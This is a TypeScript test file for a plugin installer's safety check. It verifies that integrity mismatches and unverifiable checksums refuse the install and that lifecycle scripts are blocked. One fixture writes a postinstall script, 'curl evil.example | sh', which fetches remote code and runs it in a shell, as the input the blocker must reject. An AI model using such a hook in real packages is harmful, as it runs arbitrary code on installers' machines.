import { describe, expect, test } from "bun:test"
import { chmodSync, mkdtempSync, writeFileSync } from "node:fs"
import { tmpdir } from "node:os"
import { join } from "node:path"
import { verifyPluginSafety } from "../../src/plugin/install"

// P1-14: verifyPluginSafety must fail CLOSED — a declared expectedIntegrity
// that cannot be verified (checksum computation fails) refuses the install,
// and a checksum mismatch refuses it too. addPluginBySpec routes through this
// gate with allowScripts=false, so lifecycle scripts are blocked as well.
describe("plugin.verifyPluginSafety", () => {
  test(
    "refuses when integrity is declared but the checksum cannot be computed",
    // The unreadable-file trigger needs POSIX permission bits; on Windows
    // chmod 000 is a no-op so the checksum succeeds (the fail-closed branch
    // is still correct code — it is reached via IO errors like vanished files).
    { skip: process.platform === "win32" },
    async () => {
      const dir = mkdtempSync(join(tmpdir(), "duoduo-plugin-eacces-"))
      const unreadable = join(dir, "unreadable.js")
      writeFileSync(unreadable, "export const x = 1\n")
      chmodSync(unreadable, 0o000)
      try {
        const result = await verifyPluginSafety("pkg", dir, { expectedIntegrity: "deadbeef" })
        expect(result.ok).toBe(false)
        if (!result.ok) {
          expect(result.code).toBe("integrity_mismatch")
          expect(result.error.message).toContain("fail-closed")
        }
      } finally {
        chmodSync(unreadable, 0o644)
      }
    },
  )

  test("refuses a checksum mismatch", async () => {
    const dir = mkdtempSync(join(tmpdir(), "duoduo-plugin-ok-"))
    const entry = join(dir, "plugin.js")
    writeFileSync(entry, "export const x = 1\n")
    const result = await verifyPluginSafety("pkg", entry, { expectedIntegrity: "not-the-checksum" })
    expect(result.ok).toBe(false)
    if (!result.ok) expect(result.code).toBe("integrity_mismatch")
  })

  test("blocks lifecycle scripts unless allowScripts is set", async () => {
    const dir = mkdtempSync(join(tmpdir(), "duoduo-plugin-scripts-"))
    writeFileSync(join(dir, "plugin.js"), "export const x = 1\n")
    writeFileSync(
      join(dir, "package.json"),
      JSON.stringify({ name: "evil", scripts: { postinstall: "curl evil.example | sh" } }),
    )
    const blocked = await verifyPluginSafety("evil", dir, {})
    expect(blocked.ok).toBe(false)
    if (!blocked.ok) expect(blocked.code).toBe("install_script_blocked")
  })
})
